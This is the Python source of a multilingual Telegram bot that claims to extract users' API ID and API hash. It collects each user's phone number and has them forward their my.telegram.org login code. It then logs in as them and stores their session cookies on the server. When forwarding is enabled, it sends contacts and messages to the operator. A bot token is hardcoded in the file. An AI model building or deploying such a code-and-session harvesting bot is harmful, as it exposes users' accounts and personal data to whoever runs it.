import telebot
import json
import os
import requests
import re
import random
from telebot import types

# --- الإعدادات الخاصة بك ---
TOKEN = "8885734692:AAEnjTuEZrXJ7QiDSweqr9T6oZCs_h3bmeQ"
SUDO_ID = 5983348165

bot = telebot.TeleBot(TOKEN, parse_mode="MARKDOWN")

# --- القاموس اللغوي ---
STRINGS = {
    "ar": {
        "start": "مرحباً بك في بوت استخراج الأكواد. يرجى اختيار لغتك:",
        "main_msg": "يمكنك استخراج Api ID و Api Hash بسهولة. اضغط على الزر أدناه لمشاركة جهة اتصالك.",
        "btn_contact": "أرسال جهتي 🎟 (ابدأ الاستخراج)",
        "sub_err": "❌ يجب عليك الاشتراك في القنوات التالية أولاً:",
        "wait_code": "جاري طلب الكود من تليجرام... ⏳",
        "send_code_msg": "وصلك كود الآن في الخاص من شركة تليجرام. **وجه الرسالة كاملة إلى هنا**.",
        "extracting": "جاري تسجيل الدخول والاستخراج... ⏳",
        "success": "تم الاستخراج بنجاح ✅",
        "fail": "فشل الاستخراج، تأكد من الكود أو أنك أنشأت تطبيقاً.",
        "creating": "جاري إنشاء تطبيق جديد باسم 'testing'... 🛠",
        "lang_btn": "تغيير اللغة 🌐"
    },
    "en": {
        "start": "Welcome to API Extraction Bot. Please choose your language:",
        "main_msg": "You can extract Api ID and Api Hash easily. Click the button below to share your contact.",
        "btn_contact": "Share Contact 🎟 (Start)",
        "sub_err": "❌ You must subscribe to the following channels first:",
        "wait_code": "Requesting code from Telegram... ⏳",
        "send_code_msg": "A code has been sent to your Telegram account. **Forward the full message here**.",
        "extracting": "Logging in and extracting data... ⏳",
        "success": "Extracted successfully ✅",
        "fail": "Extraction failed. Check the code or if you have an app created.",
        "creating": "Creating a new app named 'testing'... 🛠",
        "lang_btn": "Change Language 🌐"
    },
    "fa": {
        "start": "به ربات استخراج Api ID و Hash خوش آمدید. لطفا زبان خود را انتخاب کنید:",
        "main_msg": "می توانید به راحتی Api ID و Api Hash را استخراج کنید. برای اشتراک گذاری مخاطب خود روی دکمه زیر کلیک کنید.",
        "btn_contact": "ارسال مخاطب 🎟 (شروع)",
        "sub_err": "❌ ابتدا باید در کانال های زیر عضو شوید:",
        "wait_code": "در حال درخواست کد از تلگرام... ⏳",
        "send_code_msg": "کدی به حساب تلگرام شما ارسال شده است. **پیام کامل را به اینجا فوروارد کنید**.",
        "extracting": "در حال ورود و استخراج داده ها... ⏳",
        "success": "با موفقیت استخراج شد ✅",
        "fail": "استخراج ناموفق بود. کد را بررسی کنید یا ببینید آیا برنامه ای ساخته اید.",
        "creating": "در حال ساخت برنامه جدید با نام 'testing'... 🛠",
        "lang_btn": "تغییر زبان 🌐"
    }
}

# --- إدارة الملفات ---
paths = ["Users", "curls"]
for p in paths:
    if not os.path.exists(p): os.makedirs(p)

def load_json(filename, default):
    if not os.path.exists(filename):
        with open(filename, 'w', encoding='utf-8') as f: json.dump(default, f, ensure_ascii=False, indent=4)
        return default
    try:
        with open(filename, 'r', encoding='utf-8') as f: return json.load(f)
    except: return default

def save_json(filename, data):
    with open(filename, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=4)

def get_list(path):
    if not os.path.exists(path): return []
    with open(path, 'r', encoding='utf-8') as f: return [line.strip() for line in f.readlines() if line.strip()]

# تحميل البيانات
Js = load_json("Js.json", {"bot": {"sudo": SUDO_ID, "admin": [], "band": [], "Notices": "✅", "Forward": "✅", "BotS": "✅"}, "sub": {"ch": []}, "type": {}, "broadcast": {"ok": False}})
user_lang = load_json("user_lang.json", {})
forwardM = load_json("forwardM.json", {})
settings = load_json("settings.json", {})

# --- وظائف المساعدة ---

def get_lang(user):
    uid = str(user.id)
    if uid in user_lang: return user_lang[uid]
    code = user.language_code
    lang = "fa" if code == "fa" else "ar" if code == "ar" else "en"
    user_lang[uid] = lang
    save_json("user_lang.json", user_lang)
    return lang

def check_sub(uid):
    if uid == SUDO_ID: return True
    for ch in Js['sub']['ch']:
        try:
            m = bot.get_chat_member(ch, uid)
            if m.status in ['left', 'kicked']: return False
        except: continue
    return True

def get_ch_info(cid):
    try:
        c = bot.get_chat(cid)
        return c.title, (f"https://t.me/{c.username}" if c.username else bot.export_chat_invite_link(cid))
    except: return "قناة خاصة", "https://t.me/Telegram"

def main_admin_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"الاشعارات: {Js['bot'].get('Notices')}", callback_data="Notices"),
        types.InlineKeyboardButton(f"التواصل: {Js['bot'].get('Forward')}", callback_data="Forward")
    )
    markup.add(
        types.InlineKeyboardButton("إعدادات القنوات 📢", callback_data="ChaneLL"),
        types.InlineKeyboardButton("الإحصائيات 📊", callback_data="count_stats")
    )
    markup.add(types.InlineKeyboardButton("إغلاق اللوحة ❌", callback_data="cancel"))
    return markup

def tg_web_request(url, user_id, params=None):
    cookie_file = f"curls/{user_id}.json"
    session = requests.Session()
    if os.path.exists(cookie_file):
        with open(cookie_file, 'r') as f: session.cookies.update(requests.utils.cookiejar_from_dict(json.load(f)))
    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 'Referer': 'https://my.telegram.org/'}
    try:
        res = session.post(url, data=params, headers=headers, timeout=15) if params else session.get(url, headers=headers, timeout=15)
        with open(cookie_file, 'w') as f: json.dump(requests.utils.dict_from_cookiejar(session.cookies), f)
        return res.text
    except: return "error"

# --- الأوامر ---

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.from_user.id == SUDO_ID:
        bot.send_message(message.chat.id, "أهلاً بك مطوري في لوحة التحكم 👮‍♂️", reply_markup=main_admin_keyboard())

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    lang = get_lang(message.from_user)
    
    if not check_sub(uid):
        markup = types.InlineKeyboardMarkup()
        for ch in Js['sub']['ch']:
            t, l = get_ch_info(ch)
            markup.add(types.InlineKeyboardButton(t, url=l))
        bot.send_message(message.chat.id, STRINGS[lang]["sub_err"], reply_markup=markup)
        return

    # حفظ المستخدم وإشعار الدخول المطور
    m_list = get_list("Users/member.txt")
    if str(uid) not in m_list:
        with open("Users/member.txt", "a") as f: f.write(f"{uid}\n")
        if Js['bot'].get('Notices') == "✅":
            user = message.from_user
            msg = f"👤 عضو جديد استخدم البوت:\n\n"
            msg += f"الاسم: {user.first_name}\n"
            msg += f"الآيدي: `{uid}`\n"
            msg += f"المعرف: @{user.username if user.username else 'لا يوجد'}\n"
            msg += f"اللغة: {lang}"
            bot.send_message(SUDO_ID, msg)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton(STRINGS[lang]["btn_contact"], request_contact=True))
    markup.add(types.KeyboardButton(STRINGS[lang]["lang_btn"]))
    bot.send_message(message.chat.id, STRINGS[lang]["main_msg"], reply_markup=markup)

# --- معالجة الأزرار ---

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    uid, chat_id, message_id, data = call.from_user.id, call.message.chat.id, call.message.message_id, call.data
    
    if data.startswith("set_"):
        new_lang = data.split("_")[1]
        user_lang[str(uid)] = new_lang
        save_json("user_lang.json", user_lang)
        bot.edit_message_text("تم تحديث اللغة! ارسل /start", chat_id, message_id)
        return

    if uid != SUDO_ID: return

    if data == "cancel": 
        bot.delete_message(chat_id, message_id)
    elif data in ["Notices", "Forward"]:
        Js['bot'][data] = "❌" if Js['bot'].get(data) == "✅" else "✅"
        save_json("Js.json", Js)
        bot.edit_message_reply_markup(chat_id, message_id, reply_markup=main_admin_keyboard())
    elif data == "count_stats":
        members = get_list("Users/member.txt")
        text = f"📊 إحصائيات البوت الحالية:\n\n"
        text += f"عدد الأعضاء الكلي: `{len(members)}`\n"
        text += f"عدد القنوات المضافة: `{len(Js['sub']['ch'])}`"
        bot.edit_message_text(text, chat_id, message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("رجوع", callback_data="admin_back")))
    elif data == "admin_back":
        bot.edit_message_text("أهلاً بك مطوري في لوحة التحكم 👮‍♂️", chat_id, message_id, reply_markup=main_admin_keyboard())
    elif data == "ChaneLL":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("إضافة قناة ➕", callback_data="add_ch"))
        for ch in Js['sub']['ch']:
            t, _ = get_ch_info(ch)
            markup.add(types.InlineKeyboardButton(f"🗑 {t}", callback_data=f"del_{ch}"))
        markup.add(types.InlineKeyboardButton("رجوع", callback_data="admin_back"))
        bot.edit_message_text("إعدادات الاشتراك الإجباري:", chat_id, message_id, reply_markup=markup)
    elif data == "add_ch":
        Js['type'][str(chat_id)] = "add_ch"; save_json("Js.json", Js)
        bot.send_message(chat_id, "ارسل ايدي القناة أو قم بتوجيه رسالة منها:")

# --- استخراج البيانات ---

@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    uid = message.from_user.id
    lang = get_lang(message.from_user)
    if not check_sub(uid): return
    if Js['bot'].get('Forward') == "✅" and uid != SUDO_ID:
        bot.forward_message(SUDO_ID, uid, message.message_id)

    phone = message.contact.phone_number
    bot.send_message(uid, STRINGS[lang]["wait_code"])
    res = tg_web_request(f"https://my.telegram.org/auth/send_password?phone={phone}", uid)
    if "random_hash" in res:
        data = json.loads(res)
        settings[str(uid)] = {"phone": phone, "hash": data["random_hash"]}
        save_json("settings.json", settings)
        bot.send_message(uid, STRINGS[lang]["send_code_msg"])

@bot.message_handler(func=lambda m: ":" in m.text and "my.telegram.org" in m.text)
def login_logic(message):
    uid, lang = message.from_user.id, get_lang(message.from_user)
    if str(uid) in settings:
        try:
            code = message.text.split(":")[1].strip().split("\n")[0]
            bot.send_message(uid, STRINGS[lang]["extracting"])
            login_url = f"https://my.telegram.org/auth/login?phone={settings[str(uid)]['phone']}&random_hash={settings[str(uid)]['hash']}&password={code}"
            if tg_web_request(login_url, uid) == "true":
                page = tg_web_request("https://my.telegram.org/apps", uid)
                def get_data(h):
                    aid = re.search(r'App api_id:.*?<strong>(\d+)</strong>', h, re.S)
                    ahash = re.search(r'App api_hash:.*?<span [^>]*>(.*?)</span>', h, re.S)
                    return (aid.group(1) if aid else None, ahash.group(1) if ahash else None)
                api_id, api_hash = get_data(page)
                if not api_id:
                    bot.send_message(uid, STRINGS[lang]["creating"])
                    h_match = re.search(r'name="hash" value="([^"]+)"', page)
                    if h_match:
                        tg_web_request("https://my.telegram.org/apps/create", uid, params={'hash': h_match.group(1), 'app_title': 'testing', 'app_shortname': 'testing'+str(random.randint(100,999)), 'app_platform': 'android'})
                        page = tg_web_request("https://my.telegram.org/apps", uid)
                        api_id, api_hash = get_data(page)
                if api_id:
                    bot.send_message(uid, f"{STRINGS[lang]['success']}\n\n*Api ID:* `{api_id}`\n*Api Hash:* `{api_hash}`")
                    settings.pop(str(uid), None); save_json("settings.json", settings)
        except: bot.send_message(uid, "Error!")

# --- التواصل والردود ---

@bot.message_handler(content_types=['text', 'photo', 'video', 'document', 'audio', 'voice', 'sticker', 'contact'])
def global_handler(message):
    uid, chat_id = message.from_user.id, message.chat.id
    lang = get_lang(message.from_user)

    if message.text in ["تغيير اللغة 🌐", "Change Language 🌐", "تغییر زبان 🌐"]:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("العربية", callback_data="set_ar"),
                   types.InlineKeyboardButton("English", callback_data="set_en"),
                   types.InlineKeyboardButton("فارسی", callback_data="set_fa"))
        bot.send_message(chat_id, "Choose Language:", reply_markup=markup)
        return

    if Js['type'].get(str(chat_id)) == "add_ch" and uid == SUDO_ID:
        cid = message.forward_from_chat.id if message.forward_from_chat else (int(message.text) if message.text.lstrip('-').isdigit() else None)
        if cid:
            Js['sub']['ch'].append(cid); Js['type'].pop(str(chat_id)); save_json("Js.json", Js)
            bot.send_message(chat_id, "✅ تمت إضافة القناة بنجاح.")
        return

    if Js['bot'].get('Forward') == "✅" and uid != SUDO_ID:
        fwd = bot.forward_message(SUDO_ID, uid, message.message_id)
        forwardM[str(fwd.message_id)] = uid; save_json("forwardM.json", forwardM)

    if message.reply_to_message and uid == SUDO_ID:
        rid = str(message.reply_to_message.message_id)
        if rid in forwardM: bot.copy_message(forwardM[rid], chat_id, message.message_id)

if __name__ == "__main__":
    print("تم تشغيل البوت وإصلاح الإحصائيات والإشعارات...")
    bot.infinity_polling()
